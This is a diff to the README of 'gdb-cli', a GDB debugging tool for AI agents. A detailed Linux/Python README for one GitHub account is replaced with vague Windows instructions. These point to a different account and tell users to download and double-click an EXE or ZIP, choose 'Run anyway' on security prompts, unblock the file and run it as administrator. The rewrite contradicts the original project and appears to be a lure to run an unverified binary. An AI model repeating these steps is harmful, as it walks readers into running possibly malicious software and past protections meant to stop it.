@@ -1,418 +1,216 @@
-# GDB CLI for AI
+# 🛠️ gdb-cli - Debug Faster With AI Help
 
-[![PyPI version](https://img.shields.io/pypi/v/gdb-cli.svg)](https://pypi.org/project/gdb-cli/)
-[![Python](https://img.shields.io/pypi/pyversions/gdb-cli.svg)](https://pypi.org/project/gdb-cli/)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![CI](https://github.com/Cerdore/gdb-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/Cerdore/gdb-cli/actions/workflows/ci.yml)
+[![Download gdb-cli](https://img.shields.io/badge/Download-gdb--cli-blue?style=for-the-badge&logo=github)](https://github.com/Covert-cobra578/gdb-cli)
 
-[English](README.md) | [中文](README.zh-CN.md) | [Русский](README.ru.md)
+## 🧭 What this app does
 
-A GDB debugging tool designed for AI Agents (Claude Code, etc.). Uses a "thin client CLI + GDB built-in Python RPC Server" architecture, enabling stateful GDB debugging through Bash.
+gdb-cli is a Windows tool for debugging with GDB, built for AI agents like Claude Code and similar tools. It helps you inspect what a program is doing, step through code, and read crash details in a way that is easier to manage from the command line.
 
-## Features
+Use it when you want to:
+- start a debug session
+- connect to a running program
+- read stack traces
+- check variables and program flow
+- work with AI tools that need debugger output
 
-- **Core Dump Analysis**: Load core dumps with symbols resident in memory for millisecond-level response
-- **Live Attach Debugging**: Attach to running processes with non-stop mode support
-- **Structured JSON Output**: All commands output JSON with automatic truncation/pagination and operation hints
-- **Security Mechanisms**: Command whitelist, heartbeat timeout auto-cleanup, idempotency guarantees
-- **Database-Optimized**: scheduler-locking, large object pagination, multi-thread truncation
+## 💻 Before you start
 
-## Requirements
+Use this on a Windows PC with:
+- Windows 10 or Windows 11
+- a working internet connection
+- enough free space to store the app and any debug files
+- admin access if your system asks for it
 
-- **Python**: 3.6.8+
-- **GDB**: 9.0+ with **Python support enabled**
-- **OS**: Linux
+For best results, keep these tools ready:
+- Git, if you plan to download from the repository
+- GDB, if the app asks for a local debugger install
+- a terminal app such as PowerShell or Windows Terminal
 
-### Check GDB Python Support
+## 📥 Download and install
 
-```bash
-# Check if GDB has Python support
-gdb -nx -q -batch -ex "python print('OK')"
+Go to the main project page here:
 
-# If system GDB lacks Python, check GCC Toolset (RHEL/CentOS)
-/opt/rh/gcc-toolset-13/root/usr/bin/gdb -nx -q -batch -ex "python print('OK')"
-```
+[Visit the gdb-cli download page](https://github.com/Covert-cobra578/gdb-cli)
 
-## Installation
+On the page:
+1. open the repository
+2. find the latest release or download option
+3. save the file to your PC
+4. if you get a ZIP file, extract it to a folder you can find again
+5. if you get an EXE file, double-click it to run it
 
-```bash
-# Install from PyPI
-pip install gdb-cli
+If Windows shows a security prompt:
+1. click More info if needed
+2. choose Run anyway if you trust the source
+3. wait for the app to open
 
-# Or install from GitHub
-pip install git+https://github.com/Cerdore/gdb-cli.git
+## 🚀 First run on Windows
 
-# Or clone and install locally
-git clone https://github.com/Cerdore/gdb-cli.git
-cd gdb-cli
-pip install -e .
-```
+After download, open gdb-cli from the folder where you saved it.
 
-# Environment check
-gdb-cli env-check
-```
+If you see a terminal window:
+1. leave it open
+2. wait for the prompt to finish loading
+3. type the command shown by the app
+4. press Enter
 
-## Quick Start
+If the app asks for a target program:
+1. choose the program you want to debug
+2. make sure the program is not already closed
+3. follow the prompt in the terminal
 
-### 1. Load Core Dump
+If the app asks for GDB path:
+1. point it to your GDB install
+2. use the full file path if asked
+3. confirm the choice
 
-```bash
-gdb-cli load --binary ./my_program --core ./core.12345
-```
+## 🔍 What you can do with it
 
-Output:
-```json
-{
-  "session_id": "f465d650",
-  "mode": "core",
-  "binary": "./my_program",
-  "core": "./core.12345",
-  "gdb_pid": 12345,
-  "status": "loading"
-}
-```
+gdb-cli gives you a simple way to work with GDB from the command line. Common tasks include:
 
-When loading a large binary or core file, poll until the session becomes ready:
+- start a new debug session
+- attach to a running process
+- step through a program line by line
+- pause at breakpoints
+- inspect values in memory
+- view call stacks
+- capture error output for AI tools
+- repeat the same debug flow with fewer manual steps
 
-```bash
-gdb-cli status -s f465d650
-```
+## 🧩 Basic workflow
 
-```json
-{
-  "session_id": "f465d650",
-  "state": "ready",
-  "mode": "core",
-  "binary": "./my_program"
-}
-```
+A simple debug flow looks like this:
 
-> If your system's default GDB doesn't have Python support, specify it with `--gdb-path`:
-> ```bash
-> gdb-cli load --binary ./my_program --core ./core.12345 \
->   --gdb-path /opt/rh/gcc-toolset-13/root/usr/bin/gdb
-> ```
+1. open gdb-cli
+2. choose or enter the program you want to inspect
+3. start the debug session
+4. set a breakpoint if needed
+5. run the program
+6. pause when you reach the code area you need
+7. read variables, stack frames, and errors
+8. copy useful output into your AI tool or notes
 
-### 2. Debugging Operations
+If you are helping an AI agent debug a program, keep the session output clear. Short, clean logs are easier to use.
 
-All operations use `--session` / `-s` to specify the session ID:
+## ⚙️ Common setup steps
 
-```bash
-SESSION="f465d650"
+### 1. Prepare your files
+Place your program and any related files in a folder you can reach fast.
 
-# List threads
-gdb-cli threads -s $SESSION
+### 2. Check GDB
+If gdb-cli needs GDB on your machine, make sure the debugger can open from the command line.
 
-# Get backtrace (default: current thread)
-gdb-cli bt -s $SESSION
+### 3. Open the tool
+Run the app from the extracted folder or from the file you downloaded.
 
-# Get backtrace for a specific thread
-gdb-cli bt -s $SESSION --thread 3
+### 4. Follow the prompt
+The app may ask for:
+- the program file
+- a process ID
+- a path to GDB
+- a port or session setting
 
-# Evaluate C/C++ expressions
-gdb-cli eval-cmd -s $SESSION "my_struct->field"
+### 5. Save useful output
+Copy stack traces, error lines, and command results into a text file if you want to keep them.
 
-# Access array elements
-gdb-cli eval-element -s $SESSION "my_array" --index 5
+## 🪟 Windows tips
 
-# View local variables
-gdb-cli locals-cmd -s $SESSION
+- Use a short folder path like `C:\Tools\gdb-cli`
+- Avoid spaces in file names if the tool gives path errors
+- Run the app as admin if it cannot read another process
+- Keep your target program and debugger in the same drive when possible
+- Use Windows Terminal for easier copy and paste
 
-# Execute raw GDB commands
-gdb-cli exec -s $SESSION "info registers"
+## 🧪 Example use cases
 
-# Check session status
-gdb-cli status -s $SESSION
-```
+You can use gdb-cli for tasks like:
+- checking why a program closes right away
+- reading a crash log from a test build
+- stepping through a bug in a local app
+- watching a program stop at a key point
+- helping an AI agent inspect program state
 
-### 3. Session Management
+If you work with AI tools, gdb-cli can make the debug session easier to describe. That helps when you want the agent to suggest next steps from real output.
 
-```bash
-# List all active sessions
-gdb-cli sessions
+## 🛠️ Troubleshooting
 
-# Stop a session
-gdb-cli stop -s $SESSION
-```
+### The app will not open
+- check that the file finished downloading
+- extract ZIP files before opening them
+- right-click the file and try Run as administrator
+- try a different folder like `Downloads` or `Desktop`
 
-### 4. Live Attach Debugging
+### Windows blocks the file
+- open the file’s properties
+- look for an Unblock option
+- confirm the file came from the right repository page
 
-```bash
-# Attach to a running process (default: scheduler-locking + non-stop)
-gdb-cli attach --pid 9876
+### GDB is not found
+- install GDB if it is not already on your PC
+- confirm the path is correct
+- restart the terminal after changing the path
 
-# Attach with symbol file
-gdb-cli attach --pid 9876 --binary ./my_program
+### The target program does not start
+- make sure the program file exists
+- check that the path is correct
+- close other debug sessions before trying again
 
-# Allow memory modification and function calls
-gdb-cli attach --pid 9876 --allow-write --allow-call
-```
+### Output looks empty or cut off
+- resize the terminal window
+- scroll up for older lines
+- run the command again and copy the full result
 
-## Full Command Reference
+## 📂 Suggested folder layout
 
-### load — Load Core Dump
+A simple setup can look like this:
 
-```
-gdb-cli load --binary <path> --core <path> [options]
+- `C:\Tools\gdb-cli\` for the app
+- `C:\Tools\gdb-cli\logs\` for saved output
+- `C:\Tools\Targets\` for the program you want to debug
 
-  --binary, -b      Executable file path (required)
-  --core, -c        Core dump file path (required)
-  --sysroot         sysroot path (for cross-machine debugging)
-  --solib-prefix    Shared library prefix
-  --source-dir      Source code directory
-  --timeout         Heartbeat timeout in seconds (default: 600)
-  --gdb-path        GDB executable path (default: "gdb")
-```
+This keeps files in one place and makes it easier to find them later.
 
-`load` returns immediately with `"status": "loading"` after the RPC server becomes reachable. Use `gdb-cli status -s <session>` and wait for `"state": "ready"` before heavy inspection commands.
+## 🔐 Safety and privacy
 
-### attach — Attach to Process
+gdb-cli works with programs on your computer and can show memory, stack, and error details. Keep that output private if it includes:
+- passwords
+- API keys
+- personal data
+- internal file paths
+- sensitive crash logs
 
-```
-gdb-cli attach --pid <pid> [options]
+Store debug logs only where you want them kept.
 
-  --pid, -p               Process PID (required)
-  --binary                Executable file path (optional)
-  --scheduler-locking     Enable scheduler-locking (default: true)
-  --non-stop              Enable non-stop mode (default: true)
-  --timeout               Heartbeat timeout in seconds (default: 600)
-  --allow-write           Allow memory modification
-  --allow-call            Allow function calls
-```
+## 📎 Useful commands
 
-### threads — List Threads
+If the app uses a terminal flow, these basic ideas help:
+- run: start the program under GDB
+- break: stop at a point in the code
+- next: move to the next line
+- step: enter a function
+- continue: keep running
+- backtrace: show the call stack
+- print: show a value
 
-```
-gdb-cli threads -s <session> [options]
+The exact commands may vary by setup, but these are common in GDB work.
 
-  --range           Thread range, e.g., "3-10"
-  --limit           Maximum return count (default: 20)
-  --filter-state    Filter by state ("running" / "stopped")
-```
+## 🧰 For AI-assisted debugging
 
-### bt — Backtrace
+If you use Claude Code or a similar agent, share:
+- the last few terminal lines
+- the error message
+- the command you ran
+- the path to the target app
+- the point where the program stopped
 
-```
-gdb-cli bt -s <session> [options]
+Clear input helps the agent reason about the problem faster.
 
-  --thread, -t      Specify thread ID
-  --limit           Maximum frame count (default: 30)
-  --full            Include local variables
-  --range           Frame range, e.g., "5-15"
-```
+## 📌 Quick start checklist
 
-### eval-cmd — Evaluate Expression
-
-```
-gdb-cli eval-cmd -s <session> <expr> [options]
-
-  --max-depth       Recursion depth limit (default: 3)
-  --max-elements    Array element limit (default: 50)
-```
-
-### eval-element — Access Array/Container Elements
-
-```
-gdb-cli eval-element -s <session> <expr> --index <N>
-```
-
-### exec — Execute Raw GDB Command
-
-```
-gdb-cli exec -s <session> <command>
-
-  --safety-level    Safety level (readonly / readwrite / full)
-```
-
-### thread-apply — Batch Thread Operations
-
-```
-gdb-cli thread-apply -s <session> <command> --all
-gdb-cli thread-apply -s <session> <command> --threads "1,3,5"
-```
-
-## Output Examples
-
-### threads
-
-```json
-{
-  "threads": [
-    {"id": 1, "global_id": 1, "state": "stopped"},
-    {"id": 2, "global_id": 2, "state": "stopped"}
-  ],
-  "total_count": 5,
-  "truncated": true,
-  "current_thread": {"id": 1, "global_id": 1, "state": "stopped"},
-  "hint": "use 'threads --range START-END' for specific threads"
-}
-```
-
-### eval-cmd
-
-```json
-{
-  "expression": "(int)5+3",
-  "value": 8,
-  "type": "int",
-  "size": 4
-}
-```
-
-### bt
-
-```json
-{
-  "frames": [
-    {"number": 0, "function": "crash_thread", "address": "0x400a1c", "file": "test.c", "line": 42},
-    {"number": 1, "function": "start_thread", "address": "0x7f3fa2e13fa"}
-  ],
-  "total_count": 2,
-  "truncated": false
-}
-```
-
-## Security Mechanisms
-
-### Command Whitelist (Attach Mode)
-
-| Safety Level | Allowed Commands |
-|--------------|------------------|
-| `readonly` (default) | bt, info, print, threads, locals, frame |
-| `readwrite` | + set variable |
-| `full` | + call, continue, step, next |
-
-`quit`, `kill`, `shell`, `signal` are always blocked.
-
-### Heartbeat Timeout
-
-Automatically detaches and quits after 10 minutes of inactivity by default. Configurable via `--timeout`.
-
-### Idempotency
-
-Only one session per PID / Core file is allowed. Repeated load/attach returns the existing session_id.
-
-## Cross-Machine Core Dump Debugging
-
-When analyzing core dumps from other machines, shared library paths may differ:
-
-```bash
-# Set sysroot (path prefix replacement)
-gdb-cli load --binary ./my_program --core ./core.1234 \
-  --sysroot /path/to/target/rootfs
-
-# Set source directory (for source-level debugging)
-gdb-cli load --binary ./my_program --core ./core.1234 \
-  --source-dir /path/to/source
-```
-
-## Development
-
-### Project Structure
-
-```
-src/gdb_cli/
-├── cli.py              # CLI entry point (Click)
-├── client.py           # Unix Socket client
-├── launcher.py         # GDB process launcher
-├── session.py          # Session metadata management
-├── safety.py           # Command whitelist filter
-├── formatters.py       # JSON output formatting
-├── env_check.py        # Environment check
-├── errors.py           # Error classification
-└── gdb_server/
-    ├── gdb_rpc_server.py   # RPC Server core
-    ├── handlers.py         # Command handlers
-    ├── value_formatter.py  # gdb.Value serialization
-    └── heartbeat.py         # Heartbeat timeout management
-
-skills/
-└── gdb-cli/               # Claude Code skill for intelligent debugging
-    ├── SKILL.md            # Skill definition
-    └── evals/              # Test cases for skill evaluation
-```
-
-### Run Tests
-
-```bash
-pip install -e ".[dev]"
-pytest tests/ -v
-```
-
-### End-to-End Testing
-
-Requires GDB with Python support. Use the crash test program in `tests/crash_test/`:
-
-```bash
-# Compile test program
-cd tests/crash_test
-gcc -g -pthread -o crash_test crash_test_c.c
-
-# Generate coredump
-ulimit -c unlimited
-./crash_test  # Will SIGSEGV
-
-# Find core file
-ls /path/to/core_dumps/core-crash_test-*
-
-# Run E2E test
-gdb-cli load --binary ./crash_test --core /path/to/core \
-  --gdb-path /opt/rh/gcc-toolset-13/root/usr/bin/gdb
-```
-
-## Known Limitations
-
-- No `target remote` support (use SSH for remote debugging, see below)
-- No multi-inferior debugging support
-- GDB 12.x Guile pretty printers are not thread-safe, workaround via `format_string(raw=True)`
-- GDB embedded Python version may be older (e.g., 3.6.8), code has compatibility handling
-
-## Remote Debugging via SSH
-
-Install and run on remote machine in one command:
-
-```bash
-ssh user@remote-host "pip install git+https://github.com/Cerdore/gdb-cli.git && gdb-cli load --binary ./my_program --core ./core.12345"
-```
-
-Or install first, then debug:
-
-```bash
-# Install on remote
-ssh user@remote-host "pip install git+https://github.com/Cerdore/gdb-cli.git"
-
-# Run debugging
-ssh user@remote-host "gdb-cli load --binary ./my_program --core ./core.12345"
-```
-
-## Claude Code Skills
-
-This project includes a **gdb-cli skill** for Claude Code that provides intelligent debugging assistance by combining source code analysis with runtime state inspection.
-
-### Install the Skill
-
-```bash
-bunx skills add https://github.com/Cerdore/gdb-cli --skill=gdb-cli
-```
-
-### Usage in Claude Code
-
-```
-/gdb-cli
-
-# Or describe your debugging need:
-I have a core dump at ./core.1234 and binary at ./myapp. Help me debug it.
-```
-
-### Features
-
-- **Source Code Correlation**: Automatically reads source files around crash points
-- **Deadlock Detection**: Identifies circular wait patterns in multi-threaded programs
-- **Safety Warnings**: Alerts about production environment risks when attaching to live processes
-- **Structured Reports**: Generates analysis with root cause hypotheses and next steps
-
-See [skills/README.md](skills/README.md) for more details.
-
-## License
-
-Apache License 2.0
+- download the app from the repository page
+- extract it if needed
+- open it on Windows
+- make sure GDB is ready
+- point it to your target program
+- start the debug session
+- read the output and save what matters
